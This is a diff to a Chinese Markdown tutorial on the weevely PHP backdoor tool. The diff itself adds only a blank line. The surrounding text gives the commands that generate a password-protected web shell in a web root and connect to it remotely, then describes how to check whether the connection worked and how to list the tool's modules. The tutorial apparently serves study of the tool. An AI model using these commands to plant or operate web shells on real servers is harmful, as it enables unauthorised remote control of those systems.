@@ -28,6 +28,7 @@
 &emsp;&emsp;&emsp;生成php后门：通过命令行输入命令：<code><font color=red>weevely generate hello /var/www/html/testformd.php</font></code>生成一个路径为/var/www/html下的文件名为testformd.php的php文件，其中hello为后门连接的密码。<br>![Alt text](/picture/weevely_make.png)
 ### 2.2&emsp;连接后门 ###
 &emsp;&emsp;&emsp;通过已知的连接密码去连接php后门文件：在命令行中输入命令<code><font color=red>weevely http://192.168.182.137/backdoor.php hello</font></code>进行远程连接后门文件。其中http://192.168.182.137/backdoor.php为你想要连接的php后门文件路径，hello为连接密码。<br>![Alt text](/picture/weevely_connect.png)<br>当命令行页面显示为截图所示时即为连接页面，但并没有去验证密码的正确性，所以当出现这个页面时并不能代表你成功连接到后门。当你在当前命令行中输入任意命令就会触发源代码中的密码验证机制。来进一步去判断连接密码的正确性。（**具体验证机制说明将在下文单独说明**）如果输入任意命令时出现以下画面代表后门连接成功:<br>![Alt text](/picture/connect_success.png)
+
 出现错误提示时代表连接失败：<br>![Alt text](/picture/connect_failed.png)
 ### 2.2&emsp;后门操作 ###
 &emsp;&emsp;&emsp;连接后门成功后，在命令行中按两次Tab键可查看weevely的可利用模块：<br>![Alt text](/picture/weevely_function.png)<br>
